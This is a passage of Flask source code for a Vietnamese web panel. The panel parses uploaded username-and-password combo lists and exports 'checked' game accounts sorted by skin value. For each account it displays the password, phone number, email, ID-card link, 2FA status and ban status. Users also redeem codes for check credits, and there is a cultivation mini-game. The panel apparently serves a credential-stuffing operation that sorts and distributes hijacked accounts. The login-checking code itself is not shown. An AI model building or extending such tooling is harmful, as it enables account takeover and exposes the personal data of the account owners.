                var clean = line.replace(/^[\\s•\\-\\*→>●○■□◆◇★☆✓✔✗✘]+/, '').replace(/^\\s*\\[?\\d+\\]?\\s*[.)\\]/\\-:]?\\s+/, '').replace(/["'`]/g, '').trim();
                var ok = false; var u = '', p = '';
                var m = clean.match(/=\\s*([A-Za-z0-9_.@+\\-]{3,})\\s*[:|]\\s*([^\\s|]{3,})/);
                if (m) { u = m[1]; p = m[2]; ok = true; }
                else {
                    for (var j = 0; j < seps.length; j++) {
                        var sep = seps[j];
                        if (clean.indexOf(sep) > 0) {
                            var parts = clean.split(sep);
                            if (parts.length >= 2 && parts[0].trim().length >= 2 && parts[1].trim().length >= 3) { u = parts[0].trim(); p = parts[1].trim(); ok = true; break; }
                        }
                    }
                }
                html += (ok ? '<span class="ok">✓</span> <b>' + u + '</b> : ' + p : '<span class="bad">✗</span> ' + clean.substring(0, 80)) + '\\n';
                if (ok) valid++;
            }
            document.getElementById('loc-preview-content').innerHTML = html;
            document.getElementById('loc-valid').textContent = valid;
            document.getElementById('loc-total').textContent = lines.length;
            document.getElementById('loc-preview').style.display = 'block';
        };
        reader.readAsText(inp.files[0]);
    }
    </script>
    <div class="card" style="background:linear-gradient(135deg, rgba(0,255,136,0.05), rgba(0,240,255,0.05)); border:1.5px solid rgba(0,255,136,0.3);">
        <h3 class="card-title" style="font-size:0.95em;">🤖 HỖ TRỢ 25+ ĐỊNH DẠNG</h3>
        <div style="font-size:0.82em; color:var(--text-dim); line-height:1.9;">
            ✅ user|pass · user:pass · user pass · user,pass · user=pass · user;pass<br>
            ✅ 3081-FINAL = user:pass | Name: ...<br>
            ✅ TK: user | MK: pass<br>
            ✅ abc@gmail.com:pass · 0987xxx:pass<br>
            ✅ 1. user|pass · [1] user|pass
        </div>
    </div>'''
    return render_page(content, active_tab="loc_file", user=user)

@app.route("/loc_file/process", methods=["POST"])
@login_required
def loc_file_process():
    user = get_user()
    if "file" not in request.files:
        flash("Chưa chọn file!", "error"); return redirect(url_for("loc_file"))
    f = request.files["file"]
    if not f.filename.endswith(".txt"):
        flash("Chỉ nhận file .txt!", "error"); return redirect(url_for("loc_file"))
    content_bytes = f.read().decode("utf-8", errors="ignore")
    accs = parse_file_content_advanced(content_bytes, "auto")
    if not accs:
        flash("Không tìm thấy acc hợp lệ!", "error"); return redirect(url_for("loc_file"))
    total = len(accs)
    session["loc_accs"] = accs
    session.permanent = True
    rows = ""
    for i, (u, p) in enumerate(accs[:200], 1):
        rows += f'<div class="list-item"><div style="flex:1; min-width:0;"><div style="font-family:monospace; font-weight:600; overflow:hidden; text-overflow:ellipsis;">{i}. <b style="color:#00f0ff;">{u}</b> : <b style="color:#ff88ee;">{p}</b></div></div></div>'
    content = f'''
    <div class="card">
        <h2 class="card-title" style="color:#00ff88;">✓ Lọc thành công!</h2>
        <div class="stat-grid">
            <div class="stat-box"><div class="stat-value">{total}</div><div class="stat-label">Acc hợp lệ</div></div>
        </div>
    </div>
    <div class="card">
        <h2 class="card-title">📥 Tải File Đã Lọc</h2>
        <p style="color:var(--text-dim); font-size:0.9em; margin-bottom:14px;">Chọn định dạng muốn xuất:</p>
        <div style="display:flex; flex-direction:column; gap:10px;">
            <a href="/loc_file/download?fmt=pipe" class="btn btn-block" style="background:linear-gradient(135deg,#00ff88,#00d4aa); color:#000;">📥 Tải dạng user|pass</a>
            <a href="/loc_file/download?fmt=stt" class="btn btn-block" style="background:linear-gradient(135deg,#00f0ff,#00a5ff); color:#000;">📥 Tải dạng 1|user|pass</a>
            <a href="/loc_file/download?fmt=colon" class="btn btn-block" style="background:linear-gradient(135deg,#ffb800,#ff8800); color:#000;">📥 Tải dạng user:pass</a>
        </div>
    </div>
    <div class="card">
        <h2 class="card-title">📋 Danh Sách Đã Lọc ({total})</h2>
        {rows}
    </div>
    <a href="/loc_file" class="btn btn-secondary btn-block">← Lọc File Khác</a>'''
    return render_page(content, active_tab="loc_file", user=user)

@app.route("/loc_file/download")
@login_required
def loc_file_download():
    fmt = request.args.get("fmt", "pipe")
    accs = session.get("loc_accs", [])
    if not accs:
        flash("Không có dữ liệu — vui lòng upload lại!", "error")
        return redirect(url_for("loc_file"))
    lines = []
    if fmt == "stt":
        for i, (u, p) in enumerate(accs, 1):
            lines.append(f"{i}|{u}|{p}")
        fname = "loc_acc_stt.txt"
    elif fmt == "colon":
        for u, p in accs:
            lines.append(f"{u}:{p}")
        fname = "loc_acc_colon.txt"
    else:
        for u, p in accs:
            lines.append(f"{u}|{p}")
        fname = "loc_acc_pipe.txt"
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    return Response("\n".join(lines).encode("utf-8"), mimetype="text/plain",
                    headers={"Content-Disposition": f"attachment; filename={fname.replace('.txt', '')}_{ts}.txt"})

def build_export_lines(items, header_title, user):
    lines = ["#" + "=" * 60, f"# {header_title}", "#" + "=" * 60,
             f"# Người xuất: {user['username']}",
             f"# Thời gian: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
             f"# Tổng: {len(items)} acc", "#" + "=" * 60 + "\n"]
    for idx, h in enumerate(sorted(items, key=lambda x: x.get("time", ""), reverse=True), 1):
        tier = h.get("result", "").upper()
        sss_count = len(h.get("skins_sss", [])); ss_count = len(h.get("skins_ss", []))
        anime_count = len(h.get("skins_anime", [])); other_count = len(h.get("skins_other", []))
        total = sss_count + ss_count + anime_count + other_count
        lines += ["#" + "─" * 60, f"# [{idx}] ACC {tier}",
            f"# UID: {h.get('uid','N/A')} | Player UID: {h.get('player_uid','N/A')} | Nick: {h.get('nick','N/A') or 'Chưa đặt'}",
            f"# Level: {h.get('level',0)} | Rank: {h.get('rank','N/A')} ({h.get('rank_stars',0)}★)",
            f"# Sò: {h.get('shell',0)} | BAN: {'YES' if h.get('banned') else 'NO'}" + (f" (đến {h.get('ban_end_time')})" if h.get('ban_end_time') else ""),
            f"# SĐT: {h.get('mobile_no','') or 'Không có'} | Email: {h.get('email','') or 'Không có'}",
            f"# CCCD: {h.get('idcard','') or 'Chưa liên kết'} | 2FA: {'BẬT' if h.get('two_fa') else 'TẮT'}",
            f"# Tổng Skin: {total}", f"# Acc: {h.get('acc','')}|{h.get('password','')}"]
        if sss_count:
            lines.append(f"# ⭐ SSS ({sss_count}):")
            for s in h.get("skins_sss", []): lines.append(f"#   ⭐ [{s.get('id','')}] {s.get('hero','?')} → {s.get('skin','?')}")
        if anime_count:
            lines.append(f"# 🎴 Anime ({anime_count}):")
            for s in h.get("skins_anime", []): lines.append(f"#   🎴 [{s.get('id','')}] {s.get('hero','?')} → {s.get('skin','?')}")
        if ss_count:
            lines.append(f"# 💎 SS ({ss_count}):")
            for s in h.get("skins_ss", []): lines.append(f"#   💎 [{s.get('id','')}] {s.get('hero','?')} → {s.get('skin','?')}")
        lines += ["", f"{h.get('acc','')}|{h.get('password','')}", ""]
    return "\n".join(lines)

@app.route("/export_results")
@login_required
def export_results():
    user = get_user()
    t = request.args.get("type", "sss")
    hist = user.get("history", [])
    type_map = {"sss": ("sss", "acc_sss", "DANH SÁCH ACC SSS"),
                "ss": ("ss", "acc_ss", "DANH SÁCH ACC SS"),
                "anime": ("anime", "acc_anime", "DANH SÁCH ACC ANIME"),
                "trang": ("trang", "acc_trang", "DANH SÁCH ACC TRẮNG"),
                "banned": ("banned", "acc_ban", "DANH SÁCH ACC BAN"),
                "all": (("sss","ss","anime","trang"), "acc_all_vip", "DANH SÁCH ACC VIP")}
    key, fname, title = type_map.get(t, ("sss", "acc_sss", "DANH SÁCH"))
    items = [h for h in hist if h.get("result") in key] if isinstance(key, tuple) else [h for h in hist if h.get("result") == key]
    if not items:
        flash(f"Không có acc {t.upper()}!", "error"); return redirect(url_for("history"))
    file_content = build_export_lines(items, title, user)
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    return Response(file_content.encode("utf-8"), mimetype="text/plain",
                    headers={"Content-Disposition": f"attachment; filename={fname}_{ts}.txt"})

@app.route("/export_vip_all")
@login_required
def export_vip_all():
    user = get_user()
    hist = user.get("history", [])
    all_vip = [h for h in hist if h.get("result") in ("sss", "ss", "anime")]
    if not all_vip:
        flash("Chưa có acc VIP!", "error"); return redirect(url_for("history"))
    file_content = build_export_lines(all_vip, "DANH SÁCH ACC VIP (SSS + SS + ANIME)", user)
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    return Response(file_content.encode("utf-8"), mimetype="text/plain",
                    headers={"Content-Disposition": f"attachment; filename=acc_VIP_ALL_{ts}.txt"})

@app.route("/export_tool")
@login_required
def export_tool():
    user = get_user()
    content = '''<div class="card"><h2 class="card-title">📄 Tạo File Danh Sách</h2>
        <p style="color:var(--text-dim); font-size:0.85em; margin-bottom:14px;">Paste danh sách acc — tự lọc 25+ định dạng</p>
        <form method="POST" action="/export_tool/download">
        <div class="form-group"><label class="form-label">Danh sách acc</label>
            <textarea name="accs" class="form-textarea" rows="15" required style="min-height:300px;" placeholder="user1|pass1&#10;user2:pass2&#10;3083-FINAL = user3:pass3 | Name: ..."></textarea></div>
        <div class="form-group"><label class="form-label">Tên file</label>
            <input type="text" name="filename" class="form-input" value="danh_sach_acc"></div>
        <button type="submit" class="btn btn-block">📥 Xuất File .txt</button></form></div>'''
    return render_page(content, active_tab="export", user=user)

@app.route("/export_tool/download", methods=["POST"])
@login_required
def export_tool_download():
    raw = request.form.get("accs", "").strip()
    filename = request.form.get("filename", "danh_sach_acc").strip()
    safe = "".join(c for c in filename if c.isalnum() or c in "_-") or "danh_sach_acc"
    if not raw: flash("Chưa nhập!", "error"); return redirect(url_for("export_tool"))
    accs = parse_file_content_advanced(raw, "auto")
    if not accs: flash("Không có acc hợp lệ!", "error"); return redirect(url_for("export_tool"))
    return Response("\n".join([f"{u}|{p}" for u, p in accs]).encode("utf-8"), mimetype="text/plain",
                    headers={"Content-Disposition": f"attachment; filename={safe}.txt"})

@app.route("/export_tool/sample")
def export_tool_sample():
    sample = ("# File mẫu\n\n"
              "user1|pass1\nuser2:pass2\nuser3 pass3\n"
              "1. user4|pass4\n✅ user5|pass5\n"
              "3086-FINAL = user6:pass6 | Name: xxx | Level: 30\n"
              "TK: user7 | MK: pass7\nabc@gmail.com:pass8\n0987xxx:pass9\n")
    return Response(sample.encode("utf-8"), mimetype="text/plain",
                    headers={"Content-Disposition": "attachment; filename=MAU.txt"})

@app.route("/history")
@login_required
def history():
    user = get_user()
    tab = request.args.get("tab", "all")
    hist = user.get("history", [])[::-1]
    filters = {"sss": lambda h: h.get("result") == "sss", "ss": lambda h: h.get("result") == "ss",
               "anime": lambda h: h.get("result") == "anime", "trang": lambda h: h.get("result") == "trang",
               "vip": lambda h: h.get("result") in ("sss", "ss", "anime")}
    filtered = [h for h in hist if filters.get(tab, lambda h: True)(h)] if tab in filters else hist
    counts = {"all": len(hist),
        "sss": sum(1 for h in hist if h.get("result") == "sss"),
        "ss": sum(1 for h in hist if h.get("result") == "ss"),
        "anime": sum(1 for h in hist if h.get("result") == "anime"),
        "trang": sum(1 for h in hist if h.get("result") == "trang")}
    counts["vip"] = counts["sss"] + counts["ss"] + counts["anime"]
    export_btn = ""
    if tab == "vip": export_btn = f'<a href="/export_vip_all" class="btn btn-success btn-block" style="margin-bottom:14px;">📥 XUẤT VIP ALL - {counts["vip"]} acc</a>'
    elif tab in ("sss", "ss", "anime", "trang"): export_btn = f'<a href="/export_results?type={tab}" class="btn btn-success btn-block" style="margin-bottom:14px;">📥 Xuất File {tab.upper()}</a>'
    elif tab == "all": export_btn = '<a href="/export_vip_all" class="btn btn-success btn-block" style="margin-bottom:14px;">📥 Xuất Tất Cả VIP</a>'
    rows = ""
    if filtered:
        for h in filtered[:200]:
            color = {"sss": "#ffb800", "ss": "#00f0ff", "anime": "#e040fb", "normal": "#8b8b9a",
                     "trang": "#a0a0b8", "banned": "#ff2951", "failed": "#5a5a6e"}.get(h.get("result", ""), "#8b8b9a")
            hid = h.get("id", "")
            if hid:
                rows += f'''<a href="/history/{hid}" class="list-item">
                    <div style="flex:1; min-width:0;"><div style="font-family:monospace; font-weight:600; overflow:hidden; text-overflow:ellipsis;">{h['acc']}</div>
                    <div style="font-size:0.72em; color:var(--text-mute);">{h['time']} · {h.get("total_skins", 0)} skin · {h.get('rank','') or 'Chưa xếp hạng'}</div></div>
                    <div style="padding:4px 12px; background:{color}20; color:{color}; border-radius:8px; font-size:0.72em; font-weight:800; text-transform:uppercase;">{h['result']}</div>
                    <div style="color:var(--text-mute);">›</div></a>'''
    else: rows = '<p style="text-align:center; color:var(--text-dim); padding:20px;">Chưa có dữ liệu</p>'
    content = f'''
    <div class="card"><h2 class="card-title">▤ Lịch Sử Check</h2></div>
    <div class="tab-bar">
        <a href="/history?tab=all" class="tab-item {'active' if tab == 'all' else ''}">▤ Tất Cả ({counts['all']})</a>
        <a href="/history?tab=vip" class="tab-item {'active' if tab == 'vip' else ''}">★ VIP ({counts['vip']})</a>
        <a href="/history?tab=sss" class="tab-item sss-tab {'active' if tab == 'sss' else ''}">◈ SSS ({counts['sss']})</a>
        <a href="/history?tab=ss" class="tab-item ss-tab {'active' if tab == 'ss' else ''}">◆ SS ({counts['ss']})</a>
        <a href="/history?tab=anime" class="tab-item anime-tab {'active' if tab == 'anime' else ''}">◇ Anime ({counts['anime']})</a>
        <a href="/history?tab=trang" class="tab-item trang-tab {'active' if tab == 'trang' else ''}">○ Trắng ({counts['trang']})</a>
    </div>
    {export_btn}
    <div class="card"><h3 class="card-title" style="font-size:0.95em;">({len(filtered)})</h3>{rows}</div>'''
    return render_page(content, active_tab="history", user=user)

@app.route("/history/<hid>")
@login_required
def history_detail(hid):
    user = get_user()
    entry = None
    for h in user.get("history", []):
        if h.get("id") == hid: entry = h; break
    if not entry: flash("Không tìm thấy!", "error"); return redirect(url_for("history"))
    t = entry.get("result", "unknown")
    tier_colors = {"sss": ("#ffb800", "◈", "SSS"), "ss": ("#00f0ff", "◆", "SS"),
                   "anime": ("#e040fb", "◇", "ANIME"), "normal": ("#8b8b9a", "▪", "THƯỜNG"),
                   "trang": ("#a0a0b8", "○", "TRẮNG"), "banned": ("#ff2951", "✖", "BANNED"),
                   "failed": ("#5a5a6e", "✕", "LỖI")}
    color, icon, tier_label = tier_colors.get(t, ("#8b8b9a", "?", t.upper()))
    cred_box = f'''<div class="cred-box"><div class="cred-label">◈ Tài khoản</div>
        <div class="cred-value" onclick="copyText(this)">{entry.get('acc','')}</div>
        <div class="cred-label">◈ Mật khẩu</div>
        <div class="cred-value" onclick="copyText(this)">{entry.get('password','')}</div></div>'''
    sss_list = entry.get("skins_sss", []); ss_list = entry.get("skins_ss", [])
    anime_list = entry.get("skins_anime", []); other_list = entry.get("skins_other", [])
    total = len(sss_list) + len(ss_list) + len(anime_list) + len(other_list)
    def html_skins(lst, cls, ico, label):
        if not lst: return ""
        tags = "".join(f'<span class="skin-tag {cls}">{ico} [{s.get("id","")}] {s["hero"]} → {s["skin"]}</span>' for s in lst)
        return f'<div class="card"><h3 class="card-title" style="font-size:0.95em;">{ico} {label} ({len(lst)})</h3><div>{tags}</div></div>'
    sss_html = html_skins(sss_list, "skin-sss", "⭐", "SSS")
    anime_html = html_skins(anime_list, "skin-anime", "🎴", "ANIME")
    ss_html = html_skins(ss_list, "skin-ss", "💠", "SS")
    other_html = ""
    if other_list:
        hc = Counter(s["hero"] for s in other_list)
        chips = "".join(f'<span class="skin-tag skin-normal">▪ {h} × {c}</span>' for h, c in hc.most_common())
        other_html = f'<div class="card"><h3 class="card-title" style="font-size:0.95em;">▪ KHÁC ({len(other_list)})</h3><div>{chips}</div></div>'
    banner = f'''<div class="card" style="text-align:center; border:2px solid {color};">
        <div style="font-size:4em; color:{color};">{icon}</div>
        <div style="font-family:Orbitron; font-size:1.8em; font-weight:900; color:{color};">{tier_label}</div>
        <div style="font-size:0.75em; color:var(--text-mute); margin-top:8px;">{entry["time"]}</div></div>'''
    banned_text = f'<span style="color:#ff2951; font-weight:700;">🔴 BANNED' + (f' (đến {entry.get("ban_end_time")})' if entry.get("ban_end_time") else '') + '</span>' if entry.get("banned") else '<span style="color:#00ff88; font-weight:700;">🟢 CLEAN</span>'
    weekly_rows = ""
    if entry.get("best_hero"):
        weekly_rows += f'<div class="info-row"><span class="info-label">Tướng tủ</span><span class="info-value">{entry["best_hero"]}</span></div>'
    if entry.get("best_play"):
        weekly_rows += f'<div class="info-row"><span class="info-label">Trận ấn tượng</span><span class="info-value">{entry["best_play"]}</span></div>'
    if entry.get("total_matches"):
        weekly_rows += f'<div class="info-row"><span class="info-label">Tổng trận</span><span class="info-value">{entry["total_matches"]}</span></div>'
    phone_disp = entry.get("mobile_no") or "Không có"
    if entry.get("mobile_no") and entry.get("country_code"):
        phone_disp = f"{entry['mobile_no']} (+{entry['country_code']})"
    info_card = f'''<div class="card"><h3 class="card-title">◐ Thông Tin</h3>
        <div class="info-row"><span class="info-label">UID</span><span class="info-value">{entry.get("uid") or "N/A"}</span></div>
        <div class="info-row"><span class="info-label">Player UID</span><span class="info-value">{entry.get("player_uid") or "N/A"}</span></div>
        <div class="info-row"><span class="info-label">Tên đăng nhập</span><span class="info-value">{entry.get("username_display") or entry.get("acc","")}</span></div>
        <div class="info-row"><span class="info-label">Nickname</span><span class="info-value">{entry.get("nickname") or entry.get("nick") or "Chưa đặt"}</span></div>
        <div class="info-row"><span class="info-label">SĐT</span><span class="info-value">{phone_disp}</span></div>
        <div class="info-row"><span class="info-label">Email</span><span class="info-value">{entry.get("email") or "Không có"}</span></div>
        <div class="info-row"><span class="info-label">CMND</span><span class="info-value">{entry.get("idcard") or "Chưa liên kết"}</span></div>
        <div class="info-row"><span class="info-label">2FA</span><span class="info-value">{'BẬT' if entry.get("two_fa") else 'TẮT'}</span></div>
        <div class="info-row"><span class="info-label">Rank</span><span class="info-value">{entry.get("rank") or "Chưa xếp hạng"} ({entry.get("rank_stars",0)}★)</span></div>
        <div class="info-row"><span class="info-label">Level</span><span class="info-value">{entry.get("level", 0)}</span></div>
        <div class="info-row"><span class="info-label">Sò</span><span class="info-value">{entry.get("shell", 0)}</span></div>
        <div class="info-row"><span class="info-label">Trạng thái</span><span class="info-value">{banned_text}</span></div>
        <div class="info-row"><span class="info-label">Tổng Skin</span><span class="info-value">{total}</span></div></div>'''
    weekly_card = f'<div class="card"><h3 class="card-title">📊 Chiến Tích</h3>{weekly_rows}</div>' if weekly_rows else ""
    content = f'<div style="margin-bottom:14px;"><a href="/history" class="btn btn-secondary btn-sm">← Quay Lại</a></div>{banner}{cred_box}{info_card}{weekly_card}{sss_html}{anime_html}{ss_html}{other_html}'
    return render_page(content, active_tab="history", user=user)

@app.route("/enter_code", methods=["GET", "POST"])
@login_required
def enter_code():
    user = get_user()
    if request.method == "POST":
        code = request.form.get("code", "").strip().upper()
        if code in GENERATED_KEYS:
            k = GENERATED_KEYS[code]
            if k["remaining_uses"] > 0:
                k["remaining_uses"] -= 1
                if k.get("type") == "day": user["temp_balance"] = user.get("temp_balance", 0) + k["check_count"]
                else: user["balance"] = user.get("balance", 0) + k["check_count"]
                if k["remaining_uses"] <= 0: del GENERATED_KEYS[code]
                save_data(); flash(f"+{k['check_count']} lượt!", "success")
            else: flash("Code hết lượt!", "error")
        else: flash("Code không hợp lệ!", "error")
    content = '''<div class="card"><h2 class="card-title">◆ Nhập Code</h2><form method="POST">
        <div class="form-group"><label class="form-label">Mã Code</label>
            <input type="text" name="code" class="form-input" required style="text-transform:uppercase;"></div>
        <button type="submit" class="btn btn-success btn-block">Xác Nhận</button></form></div>'''
    return render_page(content, active_tab="code", user=user)

@app.route("/tu_tien")
@login_required
def tu_tien():
    user = get_user()
    cul = user.get("cultivation", {})
    lvl = cul.get("level", 0)
    lv = CULTIVATION_LEVELS[lvl] if lvl < len(CULTIVATION_LEVELS) else CULTIVATION_LEVELS[-1]
    next_lv = CULTIVATION_LEVELS[lvl + 1] if lvl + 1 < len(CULTIVATION_LEVELS) else None
    cur_mp = cul.get("mon_phai"); cur_wp = cul.get("weapon")
    mp_info = MON_PHAI.get(cur_mp, {}) if cur_mp else {}
    wp_info = VU_KHI.get(cur_wp, {}) if cur_wp else {}
    exp_next = next_lv["exp"] if next_lv else lv["exp"]
    exp_cur = cul.get("exp", 0)
    if next_lv:
        exp_prev = CULTIVATION_LEVELS[lvl]["exp"]
        pct = min(100, int(((exp_cur - exp_prev) / max(1, exp_next - exp_prev)) * 100))
    else: pct = 100
    badge = render_canh_gioi_badge(lvl, 90)
    mp_svg = render_mon_phai_svg(cur_mp, 70) if cur_mp else '<div style="font-size:3em; opacity:0.3;">⛩</div>'
    wp_svg = render_vu_khi_svg(cur_wp, 70) if cur_wp else '<div style="font-size:3em; opacity:0.3;">⚡</div>'
    content = f'''
    <div class="card" style="text-align:center; background:linear-gradient(135deg, rgba(20,0,43,0.9), rgba(40,0,80,0.9));">
        <div style="margin-bottom:12px;">{badge}</div>
        <div style="font-family:Orbitron; font-size:1.4em; font-weight:900; color:{lv["color"]};">{lv["name"]}</div>
        <div style="font-size:0.8em; color:var(--text-dim); margin-top:6px;">Cảnh giới {lvl + 1}/{len(CULTIVATION_LEVELS)}</div>
        <div style="margin-top:14px;">
            <div style="display:flex; justify-content:space-between; font-size:0.75em; color:var(--text-dim); margin-bottom:6px;">
                <span>EXP: {exp_cur}</span><span>{exp_next}</span></div>
            <div class="progress-bar-wrap" style="height:16px;">
                <div class="progress-bar-fill" style="width:{pct}%;"></div>
                <div class="progress-text" style="font-size:0.65em;">{pct}%</div></div>
        </div>
    </div>
    <div class="stat-grid-4">
        <div class="stat-box small"><div class="stat-value" style="font-size:1.1em; color:#ff4040;">{cul.get("hp",0)}</div><div class="stat-label">❤ HP</div></div>
        <div class="stat-box small"><div class="stat-value" style="font-size:1.1em; color:#ffb800;">{cul.get("atk",0)}</div><div class="stat-label">⚔ ATK</div></div>
        <div class="stat-box small"><div class="stat-value" style="font-size:1.1em; color:#00f0ff;">{cul.get("def",0)}</div><div class="stat-label">🛡 DEF</div></div>
        <div class="stat-box small"><div class="stat-value" style="font-size:1.1em; color:#e040fb;">{lvl + 1}</div><div class="stat-label">★ Cấp</div></div>
    </div>
    <div class="stat-grid" style="margin-top:14px;">
        <div class="card" style="text-align:center; margin:0;">
            <div style="margin-bottom:8px;">{mp_svg}</div>
            <div style="font-family:Orbitron; font-weight:800; font-size:0.85em; color:{mp_info.get("color", "#666") if mp_info else "#666"};">
                {mp_info.get("name", "Chưa có") if mp_info else "Chưa có"}</div>
            <div style="font-size:0.7em; color:var(--text-dim); margin-top:4px;">Môn phái</div>
        </div>
        <div class="card" style="text-align:center; margin:0;">
            <div style="margin-bottom:8px;">{wp_svg}</div>
            <div style="font-family:Orbitron; font-weight:800; font-size:0.85em; color:{wp_info.get("color", "#666") if wp_info else "#666"};">
                {wp_info.get("name", "Chưa có") if wp_info else "Chưa có"}</div>
            <div style="font-size:0.7em; color:var(--text-dim); margin-top:4px;">Vũ khí</div>
        </div>
    </div>
    <div style="margin-top:14px;">
        <form method="POST" action="/tu_tien/tuluyen" style="margin-bottom:8px;">
            <button type="submit" class="btn btn-block" style="background:linear-gradient(135deg, #ff00e5, #a855f7, #00f0ff);">⚡ TU LUYỆN NGAY</button></form>
        <a href="/tu_tien/monphai" class="btn btn-secondary btn-block" style="margin-bottom:8px;">⛩ Chọn Môn Phái</a>
        <a href="/tu_tien/vukhi" class="btn btn-secondary btn-block" style="margin-bottom:8px;">⚡ Mua Vũ Khí</a>
        <a href="/tu_tien/canh_gioi" class="btn btn-secondary btn-block">📜 Xem Cảnh Giới</a>
    </div>'''
    return render_page(content, active_tab="tu_tien", user=user)

@app.route("/tu_tien/tuluyen", methods=["POST"])
@login_required
def tu_tien_tuluyen():
    user = get_user()
    cul = user["cultivation"]
    if cul["level"] >= len(CULTIVATION_LEVELS) - 1:
        flash("Đã đạt cảnh giới cao nhất!", "success")
    else:
        gain = random.randint(10, 30) + cul["level"] * 5
        cul["exp"] = cul.get("exp", 0) + gain
        while cul["level"] < len(CULTIVATION_LEVELS) - 1 and cul["exp"] >= CULTIVATION_LEVELS[cul["level"] + 1]["exp"]:
            cul["level"] += 1
            cul["hp"] = CULTIVATION_LEVELS[cul["level"]]["hp"]
            cul["atk"] = CULTIVATION_LEVELS[cul["level"]]["atk"]
            cul["def"] = CULTIVATION_LEVELS[cul["level"]]["def"]
            flash(f"🎉 Đột phá! {CULTIVATION_LEVELS[cul['level']]['name']}", "success")
        flash(f"+{gain} EXP", "success"); save_data()
    return redirect(url_for("tu_tien"))

@app.route("/tu_tien/monphai")
@login_required
def tu_tien_monphai():
    user = get_user()
    cul = user.get("cultivation", {})
    cur_mp = cul.get("mon_phai")
    if cur_mp:
        mp = MON_PHAI[cur_mp]; lvlmp = cul.get("mon_phai_level", 0); cost = (lvlmp + 1) * 50
        content = f'''
        <div class="card" style="text-align:center; border:2px solid {mp["color"]};">
            <div style="margin-bottom:12px;">{render_mon_phai_svg(cur_mp, 120)}</div>
            <div style="font-family:Orbitron; font-size:1.5em; font-weight:900; color:{mp["color"]};">{mp["name"]}</div>
            <div style="font-size:0.8em; color:var(--text-dim); margin-top:8px;">{mp["desc"]}</div>
            <div style="margin-top:14px; display:flex; gap:8px; justify-content:center; flex-wrap:wrap;">
                <span class="mp-stat" style="color:{mp["color"]};">⚔ +{mp["bonus_atk"] + lvlmp * 5}</span>
                <span class="mp-stat" style="color:{mp["color"]};">🛡 +{mp["bonus_def"] + lvlmp * 5}</span>
                <span class="mp-stat" style="color:{mp["color"]};">❤ +{mp["bonus_hp"] + lvlmp * 10}</span>
            </div>
            <div style="margin-top:10px; font-size:0.85em;">Cấp môn phái: <b style="color:{mp["color"]};">{lvlmp + 1}</b></div>
        </div>
        <form method="POST" action="/tu_tien/monphai/upgrade">
            <button type="submit" class="btn btn-block">⬆ Nâng Cấp ({cost} xu)</button></form>
        <a href="/tu_tien" class="btn btn-secondary btn-block" style="margin-top:8px;">← Quay Lại</a>'''
    else:
        cards = ""
        for mid, mp in MON_PHAI.items():
            cards += f'''<div class="mp-card" style="color:{mp["color"]};" onclick="selectMonPhai('{mid}','{mp["name"]}')">
                {render_mon_phai_svg(mid, 90)}
                <div class="mp-name" style="color:{mp["color"]};">{mp["name"]}</div>
                <div class="mp-desc">{mp["desc"]}</div>
                <div class="mp-stats">
                    <span class="mp-stat" style="color:{mp["color"]};">⚔ +{mp["bonus_atk"]}</span>
                    <span class="mp-stat" style="color:{mp["color"]};">🛡 +{mp["bonus_def"]}</span>
                    <span class="mp-stat" style="color:{mp["color"]};">❤ +{mp["bonus_hp"]}</span>
                </div></div>'''
        content = f'''<div class="card"><h2 class="card-title">⛩ Chọn Môn Phái</h2>
            <p style="color:var(--text-dim); font-size:0.9em; margin-bottom:14px;">Bấm vào môn phái để gia nhập (chỉ chọn 1 lần)</p>
            <div class="mp-grid">{cards}</div></div>
            <a href="/tu_tien" class="btn btn-secondary btn-block">← Quay Lại</a>'''
    return render_page(content, active_tab="monphai", user=user)

@app.route("/tu_tien/monphai/join", methods=["POST"])
@login_required
def tu_tien_join_monphai():
    user = get_user()
    mid = request.form.get("mp_id", "")
    if mid in MON_PHAI:
        user["cultivation"]["mon_phai"] = mid
        user["cultivation"]["mon_phai_level"] = 0
        save_data(); flash(f"🎉 Gia nhập {MON_PHAI[mid]['name']}!", "success")
    return redirect(url_for("tu_tien_monphai"))

@app.route("/tu_tien/monphai/upgrade", methods=["POST"])
@login_required
def tu_tien_upgrade_monphai():
    user = get_user()
    cul = user["cultivation"]
    if not cul.get("mon_phai"): flash("Chưa gia nhập!", "error")
    else:
        cost = (cul.get("mon_phai_level", 0) + 1) * 50
        if user["balance"] < cost: flash(f"Cần {cost} xu!", "error")
        else:
            user["balance"] -= cost
            cul["mon_phai_level"] = cul.get("mon_phai_level", 0) + 1
            save_data(); flash("⬆ Nâng cấp thành công!", "success")
    return redirect(url_for("tu_tien_monphai"))

@app.route("/tu_tien/vukhi")
@login_required
def tu_tien_vukhi():
    user = get_user()
    cul = user.get("cultivation", {})
    cur_wp = cul.get("weapon")
    cards = ""
    for wid, w in VU_KHI.items():
        owned = (cur_wp == wid)
        cards += f'''<div class="vk-card {'owned' if owned else ''}" style="color:{w["color"]};" onclick="buyVuKhi('{wid}','{w["name"]}',{w["cost"]})">
            {render_vu_khi_svg(wid, 70)}
            <div class="vk-name" style="color:{w["color"]};">{w["name"]}</div>
            <div class="vk-atk">⚔ +{w["atk"]} ATK</div>
            <div class="vk-cost">◈ {w["cost"]} xu</div></div>'''
    content = f'''<div class="card"><h2 class="card-title">⚡ Vũ Khí</h2>
        <p style="color:var(--text-dim); font-size:0.9em; margin-bottom:14px;">Bấm vào vũ khí để mua. Số dư: <b style="color:#ff88ee;">{user["balance"]} xu</b></p>
        <div class="vk-grid">{cards}</div></div>
        <a href="/tu_tien" class="btn btn-secondary btn-block">← Quay Lại</a>'''
    return render_page(content, active_tab="vukhi", user=user)

@app.route("/tu_tien/vukhi/buy", methods=["POST"])
@login_required
def tu_tien_buy_weapon():
    user = get_user()
    wid = request.form.get("weapon_id", "")
    if wid in VU_KHI:
        w = VU_KHI[wid]
        if user["balance"] < w["cost"]: flash(f"Cần {w['cost']} xu!", "error")
        else:
            user["balance"] -= w["cost"]
            user["cultivation"]["weapon"] = wid
            save_data(); flash(f"🎉 Đã mua {w['name']}!", "success")
    return redirect(url_for("tu_tien_vukhi"))

@app.route("/tu_tien/canh_gioi")
@login_required
def tu_tien_canh_gioi():
    user = get_user()
    cul = user.get("cultivation", {})
    cur_lvl = cul.get("level", 0); cur_exp = cul.get("exp", 0)
    items = ""
    for idx, lv in enumerate(CULTIVATION_LEVELS):
